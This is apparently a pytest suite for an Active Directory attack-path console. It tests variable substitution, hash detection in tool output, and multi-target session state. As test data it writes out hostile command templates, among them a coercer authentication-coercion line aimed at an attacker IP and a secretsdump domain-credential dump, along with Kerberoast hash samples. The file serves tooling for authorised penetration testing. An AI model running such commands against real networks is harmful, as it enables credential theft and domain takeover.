"""Tests for the interactive console: variable substitution, outcome
detection, and session-level capability updates."""

from __future__ import annotations

from domainerator.console import outcomes
from domainerator.console.session import Session
from domainerator.console.variables import Variables
from domainerator.paths import Capability, Noise, PathStep, Reliability
from domainerator.runner import CheckResult, Target, ToolRunner

# --- variable substitution -------------------------------------------------

def test_substitute_fills_known_placeholders():
    v = Variables()
    v.set("LHOST", "10.0.0.5")
    v.set("DC_IP", "10.0.0.10")
    cmd = "coercer coerce -t DC-IP -l ATTACKER-IP"
    assert v.substitute(cmd) == "coercer coerce -t 10.0.0.10 -l 10.0.0.5"
    assert v.missing_placeholders(cmd) == []


def test_substitute_leaves_unset_tokens_and_reports_missing():
    v = Variables()
    cmd = "coercer coerce -t DC-IP -l ATTACKER-IP"
    # Nothing set: both placeholders remain, both reported missing.
    assert "DC-IP" in v.substitute(cmd)
    assert "ATTACKER-IP" in v.substitute(cmd)
    missing = v.missing_placeholders(cmd)
    assert "DC_IP" in missing
    assert "LHOST" in missing


def test_short_token_not_matched_inside_larger_word():
    v = Variables()
    v.set("DC", "dc01")
    v.set("DOMAIN", "corp.local")
    v.set("USER", "alice")
    # "-just-dc" must survive; trailing "@DC" is replaced.
    cmd = "secretsdump.py -just-dc DOMAIN/USER@DC"
    out = v.substitute(cmd)
    assert "-just-dc" in out
    assert out.endswith("@dc01")
    assert "corp.local/alice@dc01" in out


def test_seed_from_target_does_not_override_explicit_set():
    v = Variables()
    v.set("DC", "manual-dc")
    target = Target(host="10.0.0.10", domain="corp.local", dc_ip="10.0.0.10")
    v.seed_from_target(target)
    # Explicit set wins; unset ones get filled.
    assert v.get("DC") == "manual-dc"
    assert v.get("DOMAIN") == "corp.local"


# --- outcome detection -----------------------------------------------------

def test_interpret_kerberoast_success_grants_capability():
    output = "SVC$  $krb5tgs$23$*svc*...hash..."
    outcome = outcomes.interpret("Kerberoast", Capability.SPN_TGS, output)
    assert outcome.success
    assert outcome.capability == Capability.SPN_TGS
    assert any("krb5tgs" in item for item in outcome.loot)


def test_interpret_failure_signal_is_not_success():
    output = "[-] STATUS_LOGON_FAILURE"
    outcome = outcomes.interpret("Kerberoast", Capability.SPN_TGS, output)
    assert not outcome.success
    assert outcome.capability is None


def test_interpret_unrecognized_output_is_unconfirmed():
    outcome = outcomes.interpret("Kerberoast", Capability.SPN_TGS, "some unrelated text")
    assert not outcome.success
    assert "unconfirmed" in outcome.detail.lower()


def test_interpret_asrep_extracts_loot():
    output = "user  $krb5asrep$23$user@CORP:abcdef..."
    outcome = outcomes.interpret("AS-REP-roast", Capability.ASREP_HASH, output)
    assert outcome.success
    assert any("krb5asrep" in item for item in outcome.loot)


# --- session integration ---------------------------------------------------

def _session() -> Session:
    runner = ToolRunner(dry_run=True)
    target = Target(host="10.0.0.10", domain="corp.local")
    return Session(runner=runner, target=target)


def test_session_auto_seeds_variables_from_target():
    s = _session()
    assert s.variables.get("DC") == "10.0.0.10"
    assert s.variables.get("DOMAIN") == "corp.local"


def test_session_grant_capability_recompute_reflects_new_paths():
    s = _session()
    # Add a step that turns SPN_TGS into valid credentials so a DA path can
    # only exist once we hold the prerequisite capability.
    result = CheckResult(name="kerb", category="authenticated")
    result.add_step(
        PathStep(
            name="crack tgs",
            technique="Hash-crack",
            requires=frozenset({Capability.SPN_TGS}),
            grants=Capability.VALID_CREDENTIALS,
            command="hashcat ...",
            description="crack",
            reliability=Reliability.SPECULATIVE,
            noise=Noise.QUIET,
        )
    )
    s.add_result(result)

    s.capabilities = {Capability.UNAUTHENTICATED}
    s.recompute_paths()
    before = len(s.attack_paths)

    # Granting SPN_TGS should let the crack step fire on recompute.
    s.grant_capability(Capability.SPN_TGS)
    s.recompute_paths()
    assert Capability.SPN_TGS in s.capabilities
    # Paths should not decrease after gaining a capability.
    assert len(s.attack_paths) >= before


def test_session_add_loot_dedupes():
    s = _session()
    s.add_loot(["hashA", "hashB"])
    s.add_loot(["hashA", "hashC"])
    assert s.loot == ["hashA", "hashB", "hashC"]


# --- multi-target / sessions ----------------------------------------------

def _multi_session() -> Session:
    runner = ToolRunner(dry_run=True)
    t1 = Target(host="10.0.0.10", domain="corp.local",
                username="alice", password="pw", dc_ip="10.0.0.10")
    t2 = Target(host="10.0.0.20", domain="other.local")
    t3 = Target(host="10.0.0.30", domain="corp.local")
    return Session(runner=runner, target=t1, targets=[t1, t2, t3])


def test_active_target_included_when_targets_omitted():
    s = _session()
    # A lone target becomes the sole entry in the targets list.
    assert s.target_hosts() == ["10.0.0.10"]
    assert s.target is s.targets[0]


def test_active_target_prepended_if_missing_from_list():
    runner = ToolRunner(dry_run=True)
    active = Target(host="10.0.0.99", domain="corp.local")
    other = Target(host="10.0.0.20", domain="corp.local")
    s = Session(runner=runner, target=active, targets=[other])
    # Active target must be represented; it is inserted at the front.
    assert s.target_hosts()[0] == "10.0.0.99"
    assert "10.0.0.20" in s.target_hosts()


def test_target_hosts_lists_all_scanned():
    s = _multi_session()
    assert s.target_hosts() == ["10.0.0.10", "10.0.0.20", "10.0.0.30"]


def test_switch_target_changes_active_and_reseeds_auto_vars():
    s = _multi_session()
    assert s.target.host == "10.0.0.10"
    assert s.variables.get("DOMAIN") == "corp.local"

    assert s.switch_target(1) is True
    assert s.target.host == "10.0.0.20"
    # DC follows the new active host (auto-seeded).
    assert s.variables.get("DC") == "10.0.0.20"
    # DOMAIN follows too (was auto-seeded, target 2 has other.local).
    assert s.variables.get("DOMAIN") == "other.local"


def test_switch_target_preserves_operator_set_vars():
    s = _multi_session()
    s.variables.set("DOMAIN", "pinned.local")  # operator override
    assert s.switch_target(1) is True
    # Operator-set DOMAIN must survive a target switch.
    assert s.variables.get("DOMAIN") == "pinned.local"
    # DC (still auto) follows the switch.
    assert s.variables.get("DC") == "10.0.0.20"


def test_switch_target_out_of_range_returns_false():
    s = _multi_session()
    assert s.switch_target(99) is False
    assert s.switch_target(-1) is False
    # Active target unchanged.
    assert s.target.host == "10.0.0.10"


def test_set_then_switch_keeps_value_but_auto_var_updates():
    s = _multi_session()
    # Auto USER carried from t1.
    assert s.variables.get("USER") == "alice"
    # Operator pins USER.
    s.variables.set("USER", "svc_account")
    s.switch_target(2)  # t3 has no username
    # Pinned USER preserved; DC updated to t3.
    assert s.variables.get("USER") == "svc_account"
    assert s.variables.get("DC") == "10.0.0.30"
